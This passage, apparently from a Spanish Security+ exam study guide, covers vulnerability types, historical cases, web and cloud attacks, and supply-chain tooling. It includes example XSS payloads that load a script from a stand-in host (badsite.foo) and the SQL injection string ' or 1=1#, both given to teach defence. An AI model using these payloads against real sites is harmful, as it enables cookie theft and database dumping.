> Memoriza los tipos de alarma y sus casos de uso: **PIR** = movimiento por calor; **RFID de proximidad** = robo de equipo; **coacción** = personal amenazado. El sensor de **doble tecnología** (microondas + PIR) es la respuesta cuando la pregunta menciona reducción de falsos positivos. Pregunta trampa: ¿qué tipo de alarma es más segura entre circuito abierto y cerrado? → **Circuito cerrado** (no se anula cortando el cable).

## 7.4 Glosario

| Acrónimo | Significado |
|---|---|
| **HA** | High Availability — Alta Disponibilidad |
| **COOP** | Continuity of Operations Planning — Planificación de Continuidad de Operaciones |
| **BC** | Business Continuity — Continuidad del Negocio |
| **DR** | Disaster Recovery — Recuperación ante Desastres |
| **MTD** | Maximum Tolerable Downtime — Tiempo de Inactividad Máximo Tolerable |
| **SIEM** | Security Information and Event Management — Gestión de Eventos e Información de Seguridad |
| **TCO** | Total Cost of Ownership — Costo Total de Propiedad |
| **CMDB** | Configuration Management Database — Base de Datos de Gestión de la Configuración |
| **MDM** | Mobile Device Management — Gestión de Dispositivos Móviles |
| **UPS** | Uninterruptible Power Supply — Sistema de Alimentación Ininterrumpida |
| **PDU** | Power Distribution Unit — Unidad de Distribución de Energía |
| **PSU** | Power Supply Unit — Unidad de Fuente de Alimentación |
| **CARP** | Common Address Redundancy Protocol — Protocolo Común de Redundancia de Direcciones |
| **VIP** | Virtual IP Address — Dirección IP Virtual |
| **CCTV** | Closed-Circuit Television — Televisión de Circuito Cerrado |
| **PIR** | Passive Infrared — Infrarrojo Pasivo |
| **RFID** | Radio Frequency Identification — Identificación por Radiofrecuencia |
| **NFC** | Near Field Communication — Comunicación de Campo Cercano |
| **PACS** | Physical Access Control System — Sistema de Control de Acceso Físico |
| **CPTED** | Crime Prevention Through Environmental Design — Seguridad a través del Diseño Ambiental |
| **MFA** | Multi-Factor Authentication — Autenticación Multifactor |
| **SAN** | Storage Area Network — Red de Área de Almacenamiento |
| **VM** | Virtual Machine — Máquina Virtual |
| **HDD** | Hard Disk Drive — Disco Duro Magnético |
| **SSD** | Solid State Drive — Unidad de Estado Sólido |
| **RGPD** | Reglamento General de Protección de Datos (equivalente europeo al GDPR) |
| **HIPAA** | Health Insurance Portability and Accountability Act |
| **UAV** | Unmanned Aerial Vehicle — Vehículo Aéreo No Tripulado (Dron) |
| **JFS** | Journaled File System — Sistema de Archivos con Registro por Diario |
| **NTFS** | New Technology File System — Sistema de Archivos de Nueva Tecnología |
| **ROI** | Return on Investment — Retorno de la Inversión |
| **DoS** | Denial of Service — Denegación de Servicio |

---

## 8 Gestión de vulnerabilidades

**Gestión de Vulnerabilidades** (Vulnerability Management): proceso cíclico y continuo de:

- **Componentes cubiertos:** sistemas operativos, aplicaciones, hardware, redes
- **Técnicas de remediación:** aplicación de parches, hardening de configuraciones, actualización de SO, revisión de código, actualización de librerías de terceros

> Imagina que tu organización es una fortaleza medieval. La **gestión de vulnerabilidades** sería el trabajo continuo de inspeccionar cada muro, puerta y torre buscando grietas (vulnerabilidades), evaluar cuáles son las más peligrosas, repararlas (parchear/remediar) y reportar el estado de la fortaleza al rey (reportes).

## 8.1 Vulnerabilidades de Dispositivos y Sistemas Operativos

### 8.1.1 Vulnerabilidades del Sistema Operativo

> Los SO (Sistemas Operativos) son la capa más crítica de la infraestructura. Son los objetivos preferidos de los atacantes.

#### Tabla Comparativa de SO y sus Vulnerabilidades

| SO | Perfil de Riesgo | Vulnerabilidades Comunes | Caso Histórico Clave |
|---|---|---|---|
| **Windows** | Altísimo (base usuarios masiva, gobiernos, corporaciones) | Desbordamientos de búfer, validación de entradas, escalación de privilegios | `MS08-067` (Conficker, 2008), `MS17-010` + EternalBlue (WannaCry, 2017) |
| **macOS** | Medio-alto (creciente popularidad) | Controles de acceso, arranque seguro, software de terceros | Shellshock (2014) — falla en shell Bash |
| **Linux** | Alto (infraestructura cloud/servidores) | Vulnerabilidades del kernel, configuraciones erróneas, sistemas sin parches | Heartbleed (2014) — librería `OpenSSL` |
| **Android** | Alto (código abierto, fragmentación de versiones) | Parches inconsistentes entre fabricantes, apps maliciosas | Stagefright (2015) — biblioteca de medios |
| **iOS** | Medio (no open source) | Vulnerabilidades en kernel, ataques "watering hole" | Project Zero de Google (2019) — ataques de estado-nación |
| **IoT** | Muy alto (SO especializados, difícil actualización) | Firmware sin parches, credenciales por defecto | — |

#### Casos Históricos Clave para el Examen

- **`MS17-010`** → parche de Microsoft para el protocolo `SMB` (Server Message Block — protocolo de intercambio de archivos de red) → explotado por **EternalBlue** → base de **WannaCry** (ransomware, mayo 2017)
- **Heartbleed** → falla en `OpenSSL` en Linux → permitía leer memoria de sistemas → comprometía claves secretas
- **Shellshock** → falla en el shell `Bash` en sistemas Unix/macOS (2014) → control total del sistema
- **Stagefright** → librería de medios en Android → RCE (Remote Code Execution — Ejecución Remota de Código) vía MMS malicioso

> **👉 Enfoque de Examen SY0-701:**
> CompTIA pregunta relacionando **el nombre del exploit/vulnerabilidad con el sistema operativo afectado**. Memoriza los 5 casos históricos. Distractor común: atribuir WannaCry a Linux o Heartbleed a Windows. Vigilar que `MS17-010` = `SMB` = EternalBlue = WannaCry (cadena completa). También puede preguntar por "fragmentación" como riesgo específico de **Android**.

### 8.1.2 Tipos de Vulnerabilidad y Explotación

#### Sistemas Heredados y de Fin de Vida (EOL)

> **Analogía:** Un auto sin soporte del fabricante. Ya no te envían actualizaciones de seguridad del motor, pero tú sigues usándolo. Si descubren un defecto de fábrica, nunca lo arreglarán.

| Concepto | Descripción | Diferencia Clave |
|---|---|---|
| **EOL** (End of Life — Fin de Vida) | El fabricante declaró públicamente que NO dará más soporte ni parches | Sin soporte del proveedor |
| **Sistema Heredado** (Legacy) | Tecnología obsoleta que sigue en uso por costo/complejidad del reemplazo | Puede o no tener soporte del proveedor |

- **Ejemplos EOL:** Windows 7 y Windows Server 2008 → sin actualizaciones desde enero 2020
- **Riesgo principal:** Sin parches de seguridad para nuevas vulnerabilidades descubiertas
- **Hardware de segunda mano/recertificado:** Puede contener vulnerabilidades conocidas en firmware o drivers sin posibilidad de soporte
- **Criterios para reemplazar EOL:**
  - Disponibilidad de soporte del proveedor
  - Compatibilidad con infraestructura existente
  - Garantía y rendimiento en el mercado
  - Costos de transición (licencias, hardware, implementación)

#### Vulnerabilidades de Firmware

**Firmware:** software fundamental que controla el hardware directamente.

- **Meltdown y Spectre** (2018) → vulnerabilidades en **procesadores** → permitían robo de datos en procesamiento → afectaron casi todas las computadoras y dispositivos móviles
- **LoJax** (2018) → malware en **firmware UEFI** (Unified Extensible Firmware Interface — Interfaz de Firmware Extensible Unificada) → persistía **incluso tras reemplazar el disco duro o reinstalar el SO**
- **Riesgo EOL de hardware:** Fabricantes que dejan de proveer actualizaciones de firmware crean vectores permanentes

#### Vulnerabilidades de Virtualización

> **Analogía:** Un edificio de apartamentos. Si alguien escapa de su apartamento (VM), puede acceder a los otros pisos (otras VMs o el edificio mismo/host).

| Tipo de Vulnerabilidad | Descripción | Ejemplo |
|---|---|---|
| **Escape de VM** | Un atacante sale del entorno aislado de la VM y accede al host u otras VMs | Cloudburst (`CVE-2009-1244`) en VMware ESX Server |
| **Reutilización de recursos** | Datos residuales en disco/memoria asignados a nueva VM sin sanitizar previamente | Una nueva VM lee datos de la VM anterior |
| **Vulnerabilidades de hipervisor** | Fallos en el software de gestión de VMs (hipervisor) | Interfaces de administración con autenticación débil |

**Mitigaciones de virtualización:**
- Sanitización exhaustiva de datos entre usos
- Cifrado de datos durante todo el ciclo de vida
- Gestión robusta de claves de cifrado
- Segregación de recursos por niveles de seguridad
- Parcheo regular del hipervisor

> **👉 Enfoque de Examen SY0-701:**
> "VM escape" y "reutilización de recursos" son los dos vectores de virtualización más preguntados. Distingue EOL (sin soporte) vs Legacy (obsoleto pero puede tener soporte). El examen puede describir LoJax para preguntar qué tipo de vulnerabilidad representa → respuesta: **firmware/UEFI**. Spectre/Meltdown = vulnerabilidades de **hardware/procesador**, no de SO.

### 8.1.3 Vulnerabilidades de Día Cero

> **Analogía:** Una grieta en el muro de tu fortaleza que NADIE ha descubierto todavía — ni tú ni el atacante público. Cuando el atacante la encuentra primero, tienes "cero días" para repararla antes de que te ataque.

**Vulnerabilidad de Día Cero** (Zero-Day): falla de software/hardware **previamente desconocida** que puede ser explotada antes de que el desarrollador o proveedor la conozca o la haya parcheado.

#### Características Clave

- **Cero días** = los desarrolladores tienen 0 días para corregirlo al momento del descubrimiento
- **Sigilosas:** Las defensas basadas en firmas (antivirus, firewalls tradicionales) son **ineficaces** porque no existe firma conocida
- **Alto valor:** Un exploit zero-day para SO móvil puede valer **millones de dólares**
- **Actores que las usan:** Crimen organizado, atacantes de estado-nación, agencias de seguridad gubernamentales
- **Objetivos preferidos:** Instituciones gubernamentales y grandes corporaciones (alto valor)
- Las agencias de seguridad y fuerzas del orden pueden **almacenar zero-days** para investigaciones

#### Proceso de Divulgación Responsable

```
Investigador descubre zero-day
↓
Notificación PRIVADA al proveedor
↓
Proveedor desarrolla parche
↓
Divulgación PÚBLICA de la vulnerabilidad
```

> **Divulgación responsable:** práctica de informar privadamente al proveedor para que desarrolle un parche ANTES de hacer pública la vulnerabilidad.

> **👉 Enfoque de Examen SY0-701:**
> La pregunta clave es "¿por qué las defensas tradicionales fallan contra zero-days?" → porque se basan en **firmas conocidas**. Otro escenario: "¿qué tipo de actores usan zero-days?" → actores avanzados (APT — Advanced Persistent Threat), estado-nación. Distingue zero-day *vulnerabilidad* vs zero-day *exploit* (código que la aprovecha) vs zero-day *ataque* (el ataque que usa el exploit).

### 8.1.4 Vulnerabilidades de Configuración Errónea

> **Analogía:** Dejar la puerta principal de tu casa abierta porque así venía de fábrica. No hubo un "hackeo" — simplemente nadie la cerró.

**Configuración errónea** (Misconfiguration): ajuste incorrecto de sistemas, redes o aplicaciones que genera vulnerabilidades de seguridad.

#### Orígenes Comunes

| Origen | Ejemplo |
|---|---|
| **Configuraciones predeterminadas** | Usuario: `admin` / Contraseña: `admin`; servicios innecesarios habilitados |
| **Servicios en la nube** | Buckets de almacenamiento accesibles públicamente por defecto |
| **Dispositivos de red** | Routers/switches con credenciales predeterminadas documentadas públicamente |
| **Resolución de incidentes urgentes** | Técnico desactiva temporalmente seguridad para aislar problema y no la reactiva |
| **Permisos excesivos** | Configuraciones que priorizan facilidad de uso sobre seguridad |

#### Principios para Mitigar Configuraciones Erróneas

- Aplicar el **principio de mínimo privilegio** (Least Privilege)
- Cambiar **siempre** las credenciales predeterminadas
- Auditar regularmente las configuraciones
- Implementar procesos de **gestión de cambios** (documentación, pruebas, aprobación)
- Revertir cambios temporales realizados durante troubleshooting

> **👉 Enfoque de Examen SY0-701:**
> CompTIA presenta escenarios donde un técnico hace un cambio "temporal" que queda permanente. La respuesta correcta siempre incluye **gestión de cambios** y **auditorías de configuración**. Distractor: confundir "misconfiguration" con "vulnerability in the code" — la misconfiguration no es un bug en el software, es un error de configuración del administrador.

### 8.1.5 Vulnerabilidades Criptográficas

> **Analogía:** Si tienes la caja fuerte más robusta del mundo pero usas una llave débil o la guardas debajo del tapete, toda la seguridad de la caja es inútil.

#### Algoritmos Débiles y Ataques

| Algoritmo | Problema | Estado Actual |
|---|---|---|
| `MD5` | Vulnerable a **ataques de colisión** (dos entradas diferentes producen el mismo hash) | **Inseguro** — no usar |
| `SHA-1` | Vulnerable a ataques de colisión | **Inseguro** — no usar |
| `DES` (Data Encryption Standard) | Clave de **56 bits** → vulnerable a fuerza bruta (demostrado a finales de los 90) | **Obsoleto** |
| `3DES` (Triple DES) | Vulnerable al ataque **Sweet32** (`CVE-2016-2183`) — ataque de cumpleaños | **Deprecado por NIST en 2017**, descontinuación recomendada para 2023 |
| `RSA` | Vulnerable si se usan claves cortas o generación de números aleatorios débil | Usar claves suficientemente largas |

#### Ataques Conocidos a Protocolos Criptográficos

| Ataque | Protocolo Afectado | Descripción |
|---|---|---|
| **Heartbleed** | `OpenSSL` | Permitía leer memoria de sistemas, comprometiendo claves secretas |
| **KRACK** (Key Reinstallation Attacks) | `WPA2` (Wi-Fi) | Interceptar y descifrar tráfico de red confidencial |
| **BEAST** (Browser Exploit Against SSL/TLS) | `SSL/TLS` | Explota debilidades en suites de cifrado de SSL y TLS temprano |
| **POODLE** (Padding Oracle On Downgraded Legacy Encryption) | `SSL 3.0` | Explota fallas de implementación en cifrado |

#### SSL/TLS — Usos

`SSL/TLS` protege:
- Sesiones de navegador web (`HTTP` → `HTTPS`)
- Correo electrónico (`SMTP`, `POP`, `IMAP`)
- Voz sobre IP (VoIP)
- Transferencias de archivos (`FTP` → `SFTP/FTPS`)
- Conexiones `VPN`
- Aplicaciones móviles con datos confidenciales

#### Protección de Claves Criptográficas

**Principio de Kerckhoffs:** Un criptosistema debe ser seguro incluso si todo sobre el sistema es público, **excepto la clave**.

| Práctica | Descripción |
|---|---|
| **HSM** (Hardware Security Module — Módulo de Seguridad Hardware) | Almacenamiento físico seguro de claves criptográficas |
| **KMS** (Key Management System — Sistema de Gestión de Claves) | Sistema de software para gestión centralizada de claves |
| **Rotación de claves** (Key Rotation) | Cambio periódico de claves para mitigar riesgos de filtración y fuerza bruta |
| **Controles de acceso** | Limitar quién puede acceder a las claves |
| **Auditoría de uso de claves** | Monitoreo y registro del uso de claves |

> **👉 Enfoque de Examen SY0-701:**
> Memoriza qué algoritmo reemplazó a cuál: DES → 3DES → AES. Sweet32 afecta a 3DES específicamente. Heartbleed = OpenSSL (no es un ataque a SSL/TLS el protocolo, sino a la librería). KRACK afecta a WPA2 (Wi-Fi). El principio de Kerckhoffs puede aparecer en preguntas conceptuales sobre PKI. HSM es la respuesta correcta para "almacenamiento seguro de claves privadas".

### 8.1.6 Instalación Lateral, Rooting y Jailbreaking

> **Analogía:** El rooting/jailbreaking es como hacerse propietario del edificio donde solo eres inquilino. Tienes más control, pero también eliminaste todas las medidas de seguridad que el propietario había instalado.

#### Definiciones

| Término | Plataforma | Descripción |
|---|---|---|
| **Rooting** | Android | Obtener acceso `root` (privilegios administrativos) para modificar archivos del sistema, instalar ROMs personalizadas y acceder a funciones restringidas |
| **Jailbreaking** | iOS (iPhone/iPad) | Eliminar las limitaciones impuestas por Apple para instalar apps no autorizadas, personalizar el dispositivo y eludir restricciones |
| **Sideloading** (Instalación Lateral) | Android (APK) / iOS | Instalar apps desde fuentes distintas a las tiendas oficiales (Google Play Store / App Store) **sin pasar por los procesos de revisión y validación** |

#### Riesgos para las Organizaciones

- Debilitan las medidas de seguridad del fabricante
- Facilitan la instalación de **malware** desde tiendas no verificadas
- Invalidan los **términos de licencia** → el dispositivo pierde soporte oficial → sin parches de seguridad futuros
- Aumentan la **superficie de ataque** del dispositivo
- En sectores regulados (salud, finanzas): riesgo de incumplimiento normativo

#### Herramientas y Términos Relacionados

- **APK** (Android Application Package): formato de archivo de instalación de apps en Android
- **F-Droid**: catálogo de apps FOSS (Free and Open Source Software — Software Libre y de Código Abierto) para Android — ejemplo de fuente de sideloading alternativa
- **MDM** (Mobile Device Management — Gestión de Dispositivos Móviles): plataformas que pueden **detectar y restringir** rooting, jailbreaking y sideloading

#### Marco Regulatorio

- **Ley de Mercados Digitales** (Digital Markets Act) de la UE y **leyes de "Right to Repair"** están cuestionando algunas restricciones de software/hardware

#### Permisos de Aplicaciones

- Apps con **permisos excesivos** pueden acceder a: datos personales, datos corporativos, contactos, historial de llamadas, ubicación, identificadores del dispositivo
- Los permisos deben alinearse con el **propósito de la aplicación**

> **👉 Enfoque de Examen SY0-701:**
> Pregunta típica: "Un empleado hizo jailbreak a su iPhone corporativo. ¿Cuál es el riesgo principal?" → pérdida de las protecciones del SO del fabricante + posible instalación de malware. MDM es la herramienta de control. Sideloading en Android = archivos APK. En iOS = jailbreak requerido (violar términos de Apple). El examen puede preguntar qué herramienta detecta dispositivos con jailbreak en una red corporativa → **MDM**.


## 8.2 Vulnerabilidades de Aplicaciones y de la Nube

### 8.2.1 Vulnerabilidades de Aplicación

#### Condición de Carrera y TOCTOU

> **Analogía:** Dos personas intentan retirar dinero al mismo tiempo desde cajeros diferentes con la misma cuenta. Si el banco no verifica y ejecuta el descuento como una operación atómica, ambos pueden retirar la misma cantidad antes de que el saldo se actualice.

**Condición de Carrera** (Race Condition): vulnerabilidad donde el resultado depende del **orden o momento de ejecución** de operaciones concurrentes.

**TOCTOU** (Time-of-Check to Time-of-Use — Tiempo de Verificación a Tiempo de Uso): tipo específico de race condition donde el **estado del sistema cambia** entre el momento en que se verifica (check) y el momento en que se usa (use).

| Ejemplo | CVE | Descripción |
|---|---|---|
| Dirty COW | `CVE-2016-5195` | Race condition en el **kernel de Linux** → escalación de privilegios local |
| SMBv3 Elevation of Privilege | `CVE-2020-0796` | Race condition en el protocolo `SMBv3` de Microsoft → ejecución de código arbitrario |

**Mitigaciones:**
- Operaciones **atómicas** (verificación y ejecución como operación indivisible)
- Uso de **cerraduras** (locks), **semáforos** y **monitores** en aplicaciones multihilo

#### Inyección de Memoria

**Inyección de Memoria** (Memory Injection): el atacante introduce código malicioso en la **memoria de proceso** de una aplicación en ejecución.

- El código inyectado se ejecuta con los **mismos privilegios** que la aplicación comprometida
- Usos: instalar malware, exfiltrar datos, crear backdoors

**Tipos de ataques de inyección de memoria:**
- Desbordamiento de búfer (Buffer Overflow)
- Vulnerabilidades de cadena de formato
- Inyección de código

**Mitigaciones:**
- Validación de entradas y salidas
- Codificación segura
- `ASLR` (Address Space Layout Randomization — Distribución Aleatoria del Espacio de Direcciones)
- `DEP` (Data Execution Prevention — Prevención de Ejecución de Datos)
- Lenguajes de programación type-safe
- Pruebas SAST (Static Application Security Testing) y DAST (Dynamic Application Security Testing)

#### Buffer Overflow (Desbordamiento de Búfer)

> **Analogía:** Llenar un vaso hasta el límite y seguir echando agua. El exceso "desborda" hacia donde no debería ir — en este caso, hacia áreas de memoria críticas.

**Buffer:** área de memoria que la aplicación reserva para datos esperados.

**Mecanismo del ataque:**
```
Ejecución Normal:         Ejecución de Exploit:
Sub()                     Sub()
Sub() pila                NOP (instrucciones vacías)
Dirección de devolución   NOP
Main()              →     Código Shell (malicioso)
Pila Main()               NOP
Dirección de devolución → apunta al código shell
```

- Ataque de **desbordamiento de pila** (Stack Overflow): el atacante sobrescribe la **dirección de devolución** para ejecutar código arbitrario
- `NOP sled`: secuencia de instrucciones vacías (No Operation) para facilitar la ejecución del shellcode

**Mitigaciones:**
- `ASLR` (Address Space Layout Randomization)
- `DEP`/`NX bit` (Data Execution Prevention / No-Execute)
- Lenguajes de programación con gestión automática de memoria (type-safe)
- Prácticas de codificación segura con validación de límites

#### Actualización Maliciosa (Malicious Update)

> **Analogía:** Un ladrón que se disfraza de técnico de la compañía de alarmas para acceder a tu casa y desactivar la seguridad desde dentro.

**Actualización maliciosa:** actualización que aparenta ser legítima pero contiene **código dañino**.

| Caso Real | Año | Descripción |
|---|---|---|
| **CCleaner** | 2017 | Actualización no autorizada del software legítimo CCleaner contenía payload malicioso → millones de usuarios afectados |
| **SolarWinds** | 2020 | Actualización de SolarWinds Orion comprometida → distribución de backdoor malicioso → redes gubernamentales y corporativas afectadas |

**Mitigaciones:**
- Gestión segura de la **cadena de suministro de software**
- Verificación de **firmas digitales** en actualizaciones
- Gestión de actualizaciones centralizada y controlada

> **👉 Enfoque de Examen SY0-701:**
> TOCTOU es la subcategoría de race condition más preguntada. Buffer overflow → la respuesta de mitigación más importante es ASLR y DEP. El examen puede presentar un escenario de "un atacante sobrescribe la dirección de retorno" → identifica como **stack buffer overflow**. SolarWinds es el caso de supply chain attack más citado → puede aparecer en preguntas sobre cadena de suministro. La diferencia entre XSS, SQLi y buffer overflow: los primeros dos son ataques de inyección en apps web; el último es una vulnerabilidad de gestión de memoria.

### 8.2.2 Alcance de la Evaluación

**Alcance** (Scope): el producto, sistema o servicio específico que se analiza en busca de vulnerabilidades.

#### Prácticas del Alcance de Evaluación

| Práctica | Descripción |
|---|---|
| **Pruebas de seguridad** | Evaluaciones de vulnerabilidades y pentests para identificar debilidades |
| **Revisión de documentación** | Revisión de especificaciones de diseño, diagramas de arquitectura, políticas de seguridad |
| **Análisis del código fuente** | Identificar vulnerabilidades de seguridad o errores de codificación |
| **Evaluación de configuración** | Verificar alineación con mejores prácticas (controles de acceso, cifrado, autenticación) |
| **Análisis criptográfico** | Evaluar algoritmos de cifrado, gestión de claves, almacenamiento seguro |
| **Verificación de cumplimiento** | Verificar conformidad con regulaciones y marcos de seguridad |
| **Revisión de arquitectura de seguridad** | Identificar debilidades en segregación de funciones, auditorías, controles de acceso |

#### Pentester vs. Atacante

| Rol | Perspectiva del Alcance | Objetivo |
|---|---|---|
| **Pentester** | Sistema autorizado para evaluar | Identificar vulnerabilidades, reportar hallazgos, recomendar remediación |
| **Atacante** | Objetivo previsto | Explotar vulnerabilidades para acceso no autorizado, robo de datos, interrupción del servicio |

### 8.2.3 Ataques a las Aplicaciones Web

> **HTTP es stateless** (sin estado): cada solicitud es independiente. Las apps web deben gestionar sesiones mediante cookies o ID de sesión → esto crea vectores de ataque adicionales.

#### XSS — Cross-Site Scripting (Secuencias de Comandos en Sitios Cruzados)

> Analogía: Un atacante pone un cartel falso en la entrada de tu banco de confianza. Los clientes lo ven, confían en él (porque están en el banco) y siguen las instrucciones maliciosas.

**XSS:** el atacante inyecta scripts maliciosos que el navegador ejecuta porque aparenta provenir de un sitio de confianza.

| Tipo de XSS | Mecanismo | Persistencia |
|---|---|---|
| **XSS Reflejado** (Reflected/Non-Persistent) | El código malicioso viene en un enlace manipulado → el servidor lo "refleja" en la respuesta | No persiste — requiere que la víctima haga clic en el enlace |
| **XSS Almacenado** (Stored/Persistent) | El código malicioso se almacena en la base de datos del servidor | Persiste — afecta a todos los usuarios que vean el contenido |
| **XSS basado en DOM** (DOM-Based) | Explota vulnerabilidades en scripts del **lado del cliente** que manipulan el DOM (Document Object Model — Modelo de Objetos del Documento) | Varía — ocurre en el navegador sin involucrar al servidor |

**Ejemplo de XSS Almacenado:**

```html
Eche un vistazo a este sitio web increíble.
<script src="https://badsite.foo/hook.js"></script>
```

**Ejemplo de XSS Reflejado — URL maliciosa:**
> https://trusted.foo/messages?user=James<script src="https://badsite.foo/hook.js"></script>

**Usos maliciosos del XSS:**
- Robo de cookies de sesión
- Desfiguración del sitio (defacement)
- Interceptación de formularios
- Instalación de malware
- Ataques CSRF (Cross-Site Request Forgery — Falsificación de Petición en Sitios Cruzados)

#### SQLi — SQL Injection (Inyección de Código SQL)

> **Analogía:** Le preguntas al empleado del banco "¿Me puedes dar el saldo de Bob?" y en lugar del nombre escribes una instrucción que dice "dame el saldo de TODOS los clientes".

**SQL** (Structured Query Language — Lenguaje de Consulta Estructurado): lenguaje para leer y escribir en bases de datos.

**Operaciones SQL principales:** `SELECT`, `INSERT`, `DELETE`, `UPDATE`

**Ejemplo de ataque SQLi:**

Consulta legítima:
```sql
SELECT * FROM tbl_user WHERE username = 'Bob'
```

Consulta maliciosa (el atacante introduce `' or 1=1#`):
```sql
SELECT * FROM tbl_user WHERE username = '' or 1=1#
```
- `1=1` → siempre verdadero → devuelve todos los registros
- `#` → convierte el resto en comentario → anula el cierre de la consulta

**Resultado:** volcado completo de la base de datos de usuarios.

**Impacto exitoso de SQLi:**
- Extracción de datos sensibles
- Modificación o eliminación de datos
- Ejecución de código arbitrario con privilegios de la aplicación de BD

> **👉 Enfoque de Examen SY0-701:**
> XSS y SQLi son los dos ataques web más preguntados. Distingue: XSS ataca al **navegador del cliente** (inyecta JavaScript); SQLi ataca la **base de datos** (inyecta SQL). La mitigación universal para ambos es **validación/sanitización de entradas**. El examen puede presentar `' or 1=1--` o `' or 1=1#` → identifica como SQLi. Para XSS: el código malicioso se ejecuta con los permisos del **sitio de confianza**, no del atacante. DOM-based XSS ocurre solo en el cliente (sin round-trip al servidor).

### 8.2.4 Ataques a las Aplicaciones con Base en la Nube

#### Características Únicas de Ataques en la Nube

- **Modelo de responsabilidad compartida** puede crear brechas de seguridad por confusión sobre quién protege qué
- Un ataque exitoso puede dar acceso a **otros recursos dentro del mismo entorno cloud** (movimiento lateral en la nube)
- Alta accesibilidad hace a las apps cloud objetivos atractivos

#### Tipos de Ataques Específicos de la Nube

| Ataque | Descripción |
|---|---|
| **Ataque de canal lateral** (Side-Channel) | Un actor de amenazas con una instancia en el mismo servidor físico intenta extraer información de otras instancias mediante recursos compartidos |
| **Cryptojacking** | El atacante usa el poder de procesamiento de la nube para minar criptomonedas sin consentimiento → aumento masivo de costos para el usuario legítimo |
| **Buckets mal configurados** | Acceso no autorizado a datos en almacenamiento cloud por configuraciones erróneas de permisos |
| **Phishing desde la nube** | Sitios fraudulentos alojados en servicios cloud que imitan sitios legítimos |

#### CASB — Cloud Access Security Broker

**CASB** (Cloud Access Security Broker — Agente de Seguridad de Acceso a la Nube): software de gestión empresarial que media el acceso de usuarios a servicios en la nube.

**Funciones del CASB:**
- Autenticación SSO (Single Sign-On) y controles de acceso
- Escaneo de malware y dispositivos no autorizados
- Monitoreo y auditoría de actividad de usuarios y recursos
- Prevención de exfiltración de datos

**Modos de implementación:**

| Modo | Descripción | Ventaja | Desventaja |
|---|---|---|---|
| **Proxy Directo** (Forward Proxy) | Se ubica en el perímetro de la red del cliente, requiere configurar dispositivos/agentes | Inspección en tiempo real de todo el tráfico | Posible punto único de fallo; usuarios pueden bypassearlo |
| **Proxy Inverso** (Reverse Proxy) | Se ubica en el perímetro de la red cloud; no requiere configurar dispositivos del usuario | Sin configuración en clientes | Solo funciona si la app cloud soporta proxy |
| **API** | Media conexiones mediante la API del servicio cloud; no requiere dispositivo en línea | Flexible, sin impacto en el flujo de tráfico | Depende de que la API soporte las funciones requeridas |

> **Proveedores de CASB:** Symantec, Skyhigh Security, Forcepoint, Microsoft Cloud App Security, Cisco Cloudlock

> **👉 Enfoque de Examen SY0-701:**
> El modelo de responsabilidad compartida es crítico para preguntas de cloud security. Cryptojacking = minería de criptomonedas no autorizada usando recursos de la víctima. El CASB en modo proxy directo requiere agente; en modo API no requiere agente. El examen puede preguntar cuál modo de CASB no requiere configurar los dispositivos del usuario → **proxy inverso o API**. Side-channel attack en cloud = un inquilino (tenant) ataca a otro en el mismo hardware físico.

### 8.2.5 Cadena de Suministro

> **Analogía:** Si el proveedor de ladrillos que usas para construir tu fortaleza pone una puerta trasera en cada ladrillo, toda tu fortaleza estará comprometida desde el principio, aunque tú la construyas perfectamente.

**Vulnerabilidades de la cadena de suministro de software** (Supply Chain): riesgos introducidos en productos de software durante su ciclo de vida de desarrollo, distribución y mantenimiento.

#### Tipos de Proveedores y sus Riesgos

| Tipo de Proveedor | Riesgos Clave |
|---|---|
| **Proveedores de servicios** | Plataformas cloud o agencias de desarrollo con medidas de seguridad inadecuadas; comunicaciones no aseguradas |
| **Proveedores de hardware** | Firmware preinstalado con vulnerabilidades conocidas; drivers desactualizados o de proveedores no confiables; IoT con software propietario del fabricante |
| **Proveedores de software** | Librerías, frameworks y componentes de terceros desactualizados o con vulnerabilidades conocidas |

#### SBOM — Software Bill of Materials (Lista de Materiales del Software)

**SBOM** (Software Bill of Materials — Lista de Materiales del Software): inventario completo de **todos los componentes** de un producto de software.

**Contenido del SBOM:**
- Nombres de componentes
- Versiones de todos los componentes
- Información sobre proveedores
- Dependencias (librerías, frameworks, componentes de terceros)

**Beneficios del SBOM:**
- Transparencia y visibilidad de la cadena de suministro
- Identificación rápida de componentes vulnerables tras una divulgación
- Respuesta y remediación más rápidas ante incidentes
- Rastreo del origen de los componentes

#### Herramientas y Estándares SBOM

| Herramienta/Estándar | Descripción |
|---|---|
| **OWASP Dependency-Check** | Herramienta SCA (Software Composition Analysis — Análisis de Composición de Software) que identifica dependencias con vulnerabilidades conocidas y divulgadas públicamente |
| **OWASP Dependency-Track** | Plataforma que consume el output de Dependency-Check para gestión continua del SBOM |
| **SPDX** (Software Package Data Exchange — Intercambio de Datos de Paquetes de Software) | Estándar abierto para comunicar información de SBOM (componentes, licencias, referencias de seguridad) |
| **CycloneDX** | Especificación ligera de OWASP para compartir y analizar datos SBOM de forma ágil |

> **SCA** (Software Composition Analysis — Análisis de Composición de Software): categoría de herramientas automatizadas que identifican y monitorean paquetes, librerías y dependencias para detectar vulnerabilidades conocidas.

> **👉 Enfoque de Examen SY0-701:**
> SolarWinds 2020 = el caso más emblemático de supply chain attack. SBOM es la herramienta proactiva para gestionar riesgos de cadena de suministro. Memoriza que OWASP Dependency-Check es una herramienta SCA (no es un SBOM en sí, sino que ayuda a crearlo). Pregunta frecuente: "¿Qué herramienta proporciona visibilidad sobre todos los componentes de software de un producto?" → SBOM. SPDX y CycloneDX son los dos estándares de formato SBOM del examen.

## 8.3 Métodos de Identificación de Vulnerabilidades

### 8.3.1 Escaneo de Vulnerabilidades

> **Analogía:** Un detector de metales en el aeropuerto. Pasa a todos los pasajeros (hosts/sistemas) por el detector (escáner) buscando elementos conocidamente peligrosos (vulnerabilidades en la base de datos).

**Escaneo de vulnerabilidades:** proceso sistemático y automatizado de sondeo de sistemas/redes usando herramientas especializadas para detectar debilidades de seguridad conocidas.

#### Herramientas de Escaneo de Red

| Herramienta | Tipo | Descripción |
|---|---|---|
| **Nessus** (Tenable) | Comercial | Escáner de vulnerabilidades de red popular; usa "plugins" como fuente de vulnerabilidades |
| **OpenVAS** (Greenbone) | Open Source | Escáner de vulnerabilidades de red; usa NVTs (Network Vulnerability Tests — Pruebas de Vulnerabilidad de Red) |

**Qué analizan los escáneres de red:**
- Equipos cliente y dispositivos móviles
- Servidores
- Routers y switches
- Parches faltantes
- Desviaciones de configuraciones de referencia (baseline)

#### Escaneos Con y Sin Credenciales

| Tipo | Acceso | Vista obtenida | Uso recomendado |
|---|---|---|---|
